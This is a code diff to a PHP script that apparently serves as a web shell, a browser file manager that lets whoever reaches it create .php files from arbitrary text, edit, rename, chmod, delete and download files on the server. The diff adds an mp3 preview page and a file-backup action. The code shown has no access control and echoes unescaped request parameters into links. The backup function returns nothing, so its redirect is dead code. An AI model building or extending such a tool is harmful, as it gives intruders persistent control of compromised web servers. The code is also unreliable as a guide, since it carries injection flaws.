@@ -366,6 +366,14 @@ input[type=submit].edit {
 	width:100%;
 	margin-left:-7px;
 }
+input[type=submit].chmod {
+	width:101%;
+	margin-left:-7px;
+}
+input[type=submit].rename {
+	width:101%;
+	margin-left:-7px;
+}
 
 @media screen and (max-width: 600px) {
   table {
@@ -474,6 +482,9 @@ input[type=submit] {
   input[type=submit].edit {
 	width:102%;
 	margin-left:-05px;
+  }
+  textarea.edit {
+  	font-size:10px;
   }
   input[type=submit].rename {
 	width:102%;
@@ -733,7 +744,7 @@ if (isset($_GET['action'])) {
 				</tr>
 				<tr>
 					<td class="not" colspan="3">
-						<textarea readonly><?php print htmlspecialchars(file_get_contents(basename($file))) ?></textarea>
+						<textarea class="edit" readonly><?php print htmlspecialchars(file_get_contents(basename($file))) ?></textarea>
 					</td>
 				</tr>
 			<?php
@@ -852,6 +863,67 @@ if (@$_GET['act'] == 'img') {
 		<td class="not" colspan="3">
 			<center>
 				<img src="http://<?=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()).'/'.basename($file)?>">
+			</center>
+		</td>
+	</tr>
+	<?php
+	exit();
+}
+if (@$_GET['act'] == 'mp3') {
+	$file = $_GET['file'];
+	?>
+	<tr>
+		<td class="not mas sup">
+			<span class="a">
+				Filename
+			</span>
+		</td>
+		</div>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<span><u><?=permission(cwd(),basename($file))?></u></span>
+		</td>
+	</tr>
+	<tr>
+		<td class="not mas">
+			<span class="a">
+				Size 
+			</span>
+		</td>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<?=size($file)?>
+		</td>
+	</tr>
+	<tr>
+		<td class="not mas">
+			<span class="a">
+				Type
+			</span>
+		</td>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<?=get_type($file)?>
+		</td>
+	</tr>
+	<tr>
+		<td class="not" colspan="3">
+			<center>
+				<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
+				<a class="fo act t" href="?path=<?=cwd()?>&action=mp3&file=<?=$file?>">PREVIEW</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+				<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
+			</center>
+		</td>
+	</tr>
+	<tr>
+		<td class="not" colspan="3">
+			<center>
+				<audio controls>
+					<source src="http://<?=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()).'/'.basename($file)?>" type="audio/mp3">
+				</audio>
 			</center>
 		</td>
 	</tr>
@@ -1035,7 +1107,10 @@ function alert($type, $msg) {
 function makedir($dirname) {
     return is_dir($dirname) || mkdir($dirname, "0777", true);
 }
-
+function backup($filename) {
+	$backup = $filename.'.back';
+	copy($filename, $backup);
+}
 function makefile($file, $text) {
 	$handle = fopen(cwd().'/'.$file, "w");
 	fwrite($handle, $text);
@@ -1127,14 +1202,18 @@ if (isset($_GET['makefile'])) {
 	?>
 	<form method="post">
 		<tr>
-			<td class="not">
-				<center>
-					<div class="action_f">
-						<input class="action" type="text" name="file" placeholder="filename.php"><br><br>
-						<textarea name="text" placeholder="put your script or text"></textarea><br><br>
-						<input type="submit" name="submit">
-					</div>
-				</center>
+			<td>
+				<input class="action" type="text" name="file" placeholder="filename.php">
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<textarea class="edit" name="text" placeholder="put your script or text"></textarea>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<input class="edit" type="submit" name="submit">
 			</td>
 		</tr>
 	</form>
@@ -1222,7 +1301,7 @@ if (isset($_GET['chmod'])) {
 		</tr>
 		<tr>
 			<td colspan="3">
-				<input class="chmod" type="submit" name="submit" value="RENAME">
+				<input class="chmod" type="submit" name="submit" value="CHANGE">
 			</td>
 		</tr>
 	</form>
@@ -1316,7 +1395,7 @@ if (isset($_GET['rename'])) {
 		</tr>
 		<tr>
 			<td class="not" colspan="3">
-				<input class="action write" type="text" name="newname" value="<?=basename($file)?>">
+				<input class="action" type="text" name="newname" value="<?=basename($file)?>">
 			</td>
 		</tr>
 		<tr>
@@ -1479,6 +1558,8 @@ if (isset($_GET['edit'])) {
   					print("?path=".cwd()."&act=img&file={$files}");
   				} elseif ($ext === 'ico') {
   					print("?path=".cwd()."&act=img&file={$files}");
+  				} elseif ($ext === 'mp3') {
+  					print("?path=".cwd()."&act=mp3&file={$files}");
   				} else {
   					print("?path=".cwd()."&action&file={$files}");
   				} ?>'><?=basename($files)?></a>
@@ -1510,6 +1591,7 @@ if (isset($_GET['edit'])) {
 			<option value="1">delete</option>
 			<option value="2">zip</option>
 			<option value="3">copy</option>
+			<option value="5">backup</option>
 			<option value="4">download</option>
 			<?php
 			foreach ($scandir as $file_zip) {
@@ -1565,6 +1647,11 @@ if (isset($_POST['submit'])) {
 				break;
 			case '4':
 				download(basename($value));
+				break;
+			case '5':
+				if (backup($value)) {
+					header("Location: ?path=".cwd()."");
+				}
 				break;
 			}
 		}
